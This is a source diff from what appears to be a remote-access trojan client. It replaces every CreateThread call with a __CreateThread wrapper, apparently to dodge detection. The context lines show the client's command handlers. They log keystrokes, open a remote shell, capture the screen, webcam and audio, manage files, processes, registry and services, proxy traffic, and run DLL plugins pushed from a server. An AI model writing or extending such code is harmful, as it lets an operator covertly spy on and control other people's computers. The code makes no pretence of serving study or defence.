@@ -31,7 +31,7 @@ ThreadInfo* CreateKB(CONNECT_ADDRESS* conn, State& bExit) {
 	tKeyboard.run = FOREVER_RUN;
 	tKeyboard.p = new IOCPClient(bExit, false, MaskTypeNone, conn->GetHeaderEncType());
 	tKeyboard.conn = conn;
-	tKeyboard.h = (HANDLE)CreateThread(NULL, NULL, LoopKeyboardManager, &tKeyboard, 0, NULL);
+	tKeyboard.h = (HANDLE)__CreateThread(NULL, NULL, LoopKeyboardManager, &tKeyboard, 0, NULL);
 	return &tKeyboard;
 }
 
@@ -295,7 +295,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		}
 		if (data) {
 			PluginParam param(m_conn->ServerIP(), m_conn->ServerPort(), &g_bExit, m_conn);
-			CloseHandle(CreateThread(NULL, 0, ExecuteDLLProc, new DllExecParam(*info, param, data), 0, NULL));
+			CloseHandle(__CreateThread(NULL, 0, ExecuteDLLProc, new DllExecParam(*info, param, data), 0, NULL));
 			Mprintf("Execute '%s'%d succeed - Length: %d\n", info->Name, info->CallType, info->Size);
 		}
 #endif
@@ -304,7 +304,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 
 	case COMMAND_PROXY: {
 		m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
-		m_hThread[m_ulThreadCount++].h = CreateThread(NULL, 0, LoopProxyManager, &m_hThread[m_ulThreadCount], 0, NULL);;
+		m_hThread[m_ulThreadCount++].h = __CreateThread(NULL, 0, LoopProxyManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 		break;
 	}
 	
@@ -313,7 +313,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 			switch (szBuffer[1]) {
 			case SHARE_TYPE_YAMA: {
 				auto a = NewClientStartArg((char*)szBuffer + 2, IsSharedRunning, TRUE);
-				if (nullptr!=a) CloseHandle(CreateThread(0, 0, StartClientApp, a, 0, 0));
+				if (nullptr!=a) CloseHandle(__CreateThread(0, 0, StartClientApp, a, 0, 0));
 				break;
 			}
 			case SHARE_TYPE_HOLDINGHANDS:
@@ -340,10 +340,10 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 	case COMMAND_KEYBOARD: //键盘记录
 		{
 			if (m_hKeyboard) {
-				CloseHandle(CreateThread(NULL, 0, SendKeyboardRecord, m_hKeyboard->user, 0, NULL));
+				CloseHandle(__CreateThread(NULL, 0, SendKeyboardRecord, m_hKeyboard->user, 0, NULL));
 			} else {
 				m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
-				m_hThread[m_ulThreadCount++].h = CreateThread(NULL, 0, LoopKeyboardManager, &m_hThread[m_ulThreadCount], 0, NULL);;
+				m_hThread[m_ulThreadCount++].h = __CreateThread(NULL, 0, LoopKeyboardManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			}
 			break;
 		}
@@ -352,28 +352,28 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		{
 			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
 			m_hThread[m_ulThreadCount].user = m_hInstance; 
-			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopTalkManager, &m_hThread[m_ulThreadCount], 0, NULL);;
+			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopTalkManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
 	case COMMAND_SHELL:
 		{
 			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
-			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopShellManager, &m_hThread[m_ulThreadCount], 0, NULL);;
+			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopShellManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
 	case COMMAND_SYSTEM:       //远程进程管理
 		{
 			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
-			m_hThread[m_ulThreadCount++].h = CreateThread(NULL, 0, LoopProcessManager, &m_hThread[m_ulThreadCount], 0, NULL);;
+			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL, 0, LoopProcessManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
 	case COMMAND_WSLIST:       //远程窗口管理
 		{
 			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
-			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopWindowManager, &m_hThread[m_ulThreadCount], 0, NULL);;
+			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopWindowManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
@@ -402,42 +402,42 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 			}
 			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
 		    m_hThread[m_ulThreadCount].user = user;
-			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopScreenManager, &m_hThread[m_ulThreadCount], 0, NULL);;
+			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopScreenManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
 	case COMMAND_LIST_DRIVE :
 		{
 			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
-			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopFileManager, &m_hThread[m_ulThreadCount], 0, NULL);;
+			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopFileManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
 	case COMMAND_WEBCAM:
 		{
 			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
-			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopVideoManager, &m_hThread[m_ulThreadCount], 0, NULL);;
+			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopVideoManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
 	case COMMAND_AUDIO:
 		{
 			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
-			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopAudioManager, &m_hThread[m_ulThreadCount], 0, NULL);;
+			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopAudioManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
 	case COMMAND_REGEDIT:
 		{
 			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
-			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopRegisterManager, &m_hThread[m_ulThreadCount], 0, NULL);;
+			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopRegisterManager, &m_hThread[m_ulThreadCount], 0, NULL);;
 			break;
 		}
 
 	case COMMAND_SERVICES:
 		{
 			m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType());
-			m_hThread[m_ulThreadCount++].h = CreateThread(NULL,0, LoopServicesManager, &m_hThread[m_ulThreadCount], 0, NULL);
+			m_hThread[m_ulThreadCount++].h = __CreateThread(NULL,0, LoopServicesManager, &m_hThread[m_ulThreadCount], 0, NULL);
 			break;
 		}
 
